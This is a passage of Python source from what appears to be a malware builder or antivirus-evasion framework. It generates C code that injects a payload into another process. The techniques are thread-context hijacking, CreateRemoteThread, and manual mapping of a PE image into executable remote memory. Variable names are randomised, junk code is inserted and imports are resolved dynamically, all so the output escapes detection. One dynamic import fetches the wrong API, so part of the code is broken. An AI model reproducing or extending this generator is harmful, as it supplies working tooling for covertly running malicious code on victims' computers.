                Ret_code += "}}}}}while(Thread32Next(" + RandThreadsnapshot + ",&" + RandTentry + "));}\n"
            else:
                Ret_code += RandThreadsnapshot + " = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);\n"
                Ret_code += "if(" + RandThreadsnapshot + " != INVALID_HANDLE_VALUE){\n"
                Ret_code += "if(!Thread32First(" + RandThreadsnapshot + ",&" + RandTentry + ")){ CloseHandle(" + RandThreadsnapshot +");}\n"                
                Ret_code += "do{\n"
                Ret_code += "if(" + RandTentry + ".th32OwnerProcessID == " + Randentry + ".th32ProcessID){\n"
                Ret_code += "HANDLE " + RandTargetThread + " = OpenThread(THREAD_SUSPEND_RESUME|THREAD_SET_CONTEXT|THREAD_GET_CONTEXT,FALSE," + RandTentry + ".th32ThreadID);\n"
                Ret_code += "if(" + RandTargetThread + " != NULL){\n"
                Ret_code += "CONTEXT " + RandContext + ";\n"
                Ret_code += "PVOID " + RandRemCtx + " = NULL;\n"
                Ret_code += "PVOID " + RandRemStack + " = NULL;\n"
                Ret_code += "if(SuspendThread(" + RandTargetThread + ") != -1){\n"
                Ret_code += RandContext + ".ContextFlags = CONTEXT_FULL;\n"
                Ret_code += "if(GetThreadContext(" + RandTargetThread + ",&" + RandContext + ")){\n"
                Ret_code += RandRemCtx + " = VirtualAllocEx(" + RandhProcess + ", NULL,sizeof(" + RandContext + "),MEM_COMMIT,PAGE_READWRITE);\n"
                Ret_code += "WriteProcessMemory(" + RandhProcess + "," + RandRemCtx + ",&" + RandContext + ",sizeof(" + RandContext + "),NULL);\n"

                if ModOpt["Arch"] == "x86":

                    Ret_code += RandContext + ".Eip = (DWORD)" + Randlpv2 +  " + " + RandLoaderOffset +  ";\n" # GIUSTO??

                elif ModOpt["Arch"] == "x64":

                    Ret_code += RandContext + ".Rip = (DWORD64)" + Randlpv2 +  " + " + RandLoaderOffset +  ";\n"
                    Ret_code += RandContext + ".Rcx = (DWORD64)" + RandRemCtx + ";\n"
                    Ret_code += "WriteProcessMemory(" + RandhProcess + ",(LPVOID)(((LPBYTE)" + Randlpv2 +  ")+2),&" + RandContext + ".Rcx,sizeof(" + RandContext + ".Rcx),NULL);\n"

                    #let stack have some room to grow up or down
                    Ret_code += RandContext + ".Rsp = " + RandContext + ".Rsp - 0x2000;\n"

                Ret_code += "SetThreadContext(" + RandTargetThread + ",&" + RandContext + ");\n"
                Ret_code += "ResumeThread(" + RandTargetThread + ");\n"
                Ret_code += "break;"
                Ret_code += "}}}}}while(Thread32Next(" + RandThreadsnapshot + ",&" + RandTentry + "));}\n"

        else:

            if ModOpt["DynImport"] == True:

                NdcCreateRemoteThread = varname_creator()

                Ret_code += "FARPROC " + NdcCreateRemoteThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"CreateRemoteThread\");\n"
                Ret_code += "HANDLE " + RandhThread +  " = (HANDLE)" + NdcCreateRemoteThread + "(" + RandhProcess +  ", NULL,1024*1024,(LPTHREAD_START_ROUTINE)((ULONG_PTR)" + Randlpv2 +  " + " + RandLoaderOffset +  "),NULL,0,NULL);\n"


            else:

                Ret_code += "HANDLE " + RandhThread +  " = CreateRemoteThread(" + RandhProcess +  ", NULL,1024*1024,(LPTHREAD_START_ROUTINE)((ULONG_PTR)" + Randlpv2 +  " + " + RandLoaderOffset +  "),NULL,0,NULL);\n"



    elif ModOpt["ExecMethod"] in ["ManualMap","MM"]:

        NdcVirtualAllocEx = varname_creator()
        NdcWriteProcessMemory = varname_creator()

        Ret_code += "PIMAGE_DOS_HEADER " + RandImgDosHeader + ";\n"
        Ret_code += "PIMAGE_NT_HEADERS " + RandImgNTHeader + ";\n"
        Ret_code += "PIMAGE_SECTION_HEADER " + RandImgSectHeader + ";\n"
        Ret_code += "HANDLE " + RandhThread + ";\n"
        Ret_code += "LPVOID " + Randlpv2 + "," + RandLoaderMem + ";\n"
        Ret_code += "DWORD " + Randflag + ";\n"
        Ret_code += RandLoadStruct + " " + RandPtrLoader+ ";\n"
        Ret_code += RandImgDosHeader + "=(PIMAGE_DOS_HEADER)" + Randlpv + ";\n"
        Ret_code += RandImgNTHeader + "=(PIMAGE_NT_HEADERS)((LPBYTE)" + Randlpv + " + " + RandImgDosHeader + "->e_lfanew);\n"
        Ret_code += "if((" + RandImgNTHeader + "->FileHeader.Characteristics & IMAGE_FILE_DLL)){\n"

        if ModOpt["DynImport"] == True:

            Ret_code += "FARPROC " + NdcVirtualAllocEx + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"VirtualAllocEx\");\n"
            Ret_code += "FARPROC " + NdcWriteProcessMemory + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ", \"WriteProcessMemory\");\n"
            Ret_code += Randlpv2 + " = (LPVOID)" + NdcVirtualAllocEx + "(" + RandhProcess + ",(LPVOID)(" + RandImgNTHeader + "->OptionalHeader.ImageBase), " + RandImgNTHeader + "->OptionalHeader.SizeOfImage,MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
            Ret_code += "if(" + Randlpv2 + " == NULL){\n"
            Ret_code += Randlpv2 + " = (LPVOID)" + NdcVirtualAllocEx + "(" + RandhProcess + ",NULL," + RandImgNTHeader + "->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);}\n"
            Ret_code += NdcWriteProcessMemory + "(" + RandhProcess + "," + Randlpv2 + "," + Randlpv + "," + RandImgNTHeader + "->OptionalHeader.SizeOfHeaders,NULL);\n"
            Ret_code += RandImgSectHeader + " = (PIMAGE_SECTION_HEADER)(" + RandImgNTHeader + "+1);\n"
            Ret_code += "for(" + Randflag + "=0;" + Randflag + "<" + RandImgNTHeader + "->FileHeader.NumberOfSections;" + Randflag + "++){\n"
            Ret_code += NdcWriteProcessMemory + "(" + RandhProcess + ",(LPVOID)((LPBYTE)" + Randlpv2 + "+" + RandImgSectHeader + "[" + Randflag + "].VirtualAddress),(LPVOID)((LPBYTE)" + Randlpv + "+" + RandImgSectHeader + "[" + Randflag + "].PointerToRawData)," + RandImgSectHeader + "[" + Randflag + "].SizeOfRawData,NULL);}\n"
            Ret_code += RandLoaderMem + " = (LPVOID)" + NdcVirtualAllocEx + "(" + RandhProcess + ",NULL,4096,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);\n"

        else:

            Ret_code += Randlpv2 + " = VirtualAllocEx(" + RandhProcess + ",(LPVOID)(" + RandImgNTHeader + "->OptionalHeader.ImageBase), " + RandImgNTHeader + "->OptionalHeader.SizeOfImage,MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
            Ret_code += "if(" + Randlpv2 + " == NULL){\n"
            Ret_code += Randlpv2 + "=VirtualAllocEx(" + RandhProcess + ",NULL," + RandImgNTHeader + "->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);}\n"
            Ret_code += "WriteProcessMemory(" + RandhProcess + "," + Randlpv2 + "," + Randlpv + "," + RandImgNTHeader + "->OptionalHeader.SizeOfHeaders,NULL);\n"
            Ret_code += RandImgSectHeader + "=(PIMAGE_SECTION_HEADER)(" + RandImgNTHeader + "+1);\n"
            Ret_code += "for(" + Randflag + "=0;" + Randflag + "<" + RandImgNTHeader + "->FileHeader.NumberOfSections;" + Randflag + "++){\n"
            Ret_code += "WriteProcessMemory(" + RandhProcess + ",(LPVOID)((LPBYTE)" + Randlpv2 + "+" + RandImgSectHeader + "[" + Randflag + "].VirtualAddress),(LPVOID)((LPBYTE)" + Randlpv + "+" + RandImgSectHeader + "[" + Randflag + "].PointerToRawData)," + RandImgSectHeader + "[" + Randflag + "].SizeOfRawData,NULL);}\n"
            Ret_code += RandLoaderMem + " = VirtualAllocEx(" + RandhProcess + ",NULL,4096,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);\n"


        Ret_code += "memset(&" + RandPtrLoader+ ",0,sizeof(" + RandLoadStruct + "));\n"
        Ret_code += RandPtrLoader+ ".ImageBase=" + Randlpv2 + ";\n"
        Ret_code += RandPtrLoader+ ".NtHeaders=(PIMAGE_NT_HEADERS)((LPBYTE)" + Randlpv2 + "+" + RandImgDosHeader + "->e_lfanew);\n"
        Ret_code += RandPtrLoader+ ".BaseRelocation=(PIMAGE_BASE_RELOCATION)((LPBYTE)" + Randlpv2 + "+" + RandImgNTHeader + "->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);\n"
        Ret_code += RandPtrLoader+ ".ImportDirectory=(PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)" + Randlpv2 + "+" + RandImgNTHeader + "->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);\n"
        Ret_code += RandPtrLoader+ ".fnLoadLibraryA=LoadLibraryA;\n"
        Ret_code += RandPtrLoader+ ".fnGetProcAddress=GetProcAddress;\n"
        #Ret_code += RandPtrLoader+ ".fnRtlAddFunctionTable=RtlAddFunctionTable;\n"

        if ModOpt["DynImport"] == True:

            NdcCreateRemoteThread = varname_creator()
            NdcWaitForSingleObject = varname_creator()

            Ret_code += NdcWriteProcessMemory + "(" + RandhProcess + "," + RandLoaderMem + ",&" + RandPtrLoader+ ",sizeof(" + RandLoadStruct + "),NULL);\n"
            Ret_code += NdcWriteProcessMemory + "(" + RandhProcess + ",(LPVOID)((P" + RandLoadStruct + ")" + RandLoaderMem + "+1),LoadDll,(SIZE_T)LoadDllEnd-(SIZE_T)LoadDll,NULL);\n"
            Ret_code += "FARPROC " + NdcCreateRemoteThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"CreateRemoteThread\");\n"
            Ret_code += RandhThread + " = (HANDLE)" + NdcCreateRemoteThread + "(" + RandhProcess + ",NULL,0,(LPTHREAD_START_ROUTINE)((P" + RandLoadStruct + ")" + RandLoaderMem + "+1)," + RandLoaderMem + ",0,NULL);\n"
            Ret_code += "FARPROC " + NdcWaitForSingleObject + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"VirtualAllocEx\");\n"
            Ret_code += NdcWaitForSingleObject + "(" + RandhThread + ",-1);}\n"


        else:
            Ret_code += "WriteProcessMemory(" + RandhProcess + "," + RandLoaderMem + ",&" + RandPtrLoader+ ",sizeof(" + RandLoadStruct + "),NULL);\n"
            Ret_code += "WriteProcessMemory(" + RandhProcess + ",(LPVOID)((P" + RandLoadStruct + ")" + RandLoaderMem + "+1),LoadDll,(SIZE_T)LoadDllEnd-(SIZE_T)LoadDll,NULL);\n"
            Ret_code += RandhThread + "=CreateRemoteThread(" + RandhProcess + ",NULL,0,(LPTHREAD_START_ROUTINE)((P" + RandLoadStruct + ")" + RandLoaderMem + "+1)," + RandLoaderMem + ",0,NULL);\n"
            Ret_code += "WaitForSingleObject(" + RandhThread + ",-1);}\n"
            #Ret_code += "DWORD Exitcode;\n"
            #Ret_code += "GetExitCodeThread(" + RandhThread + ",&Exitcode);\n"

    Ret_code += "}}}}\n"

    Ret_code += "$:END\n"

    #Ret_code += CloseDecoyProc(ModOpt["DecoyProc"])

    Ret_code = JunkInjector(Ret_code,ModOpt["JI"],ModOpt["JF"],ModOpt["EF"],ModOpt["JR"])
    
    if ModOpt["Outformat"] == "exe":

        Ret_code += "return 0;}"

    elif ModOpt["Outformat"] == "dll":

        Ret_code += "}\n"
        Ret_code += "return bReturnValue;}\n"

    WriteSource("Source.c",Ret_code)
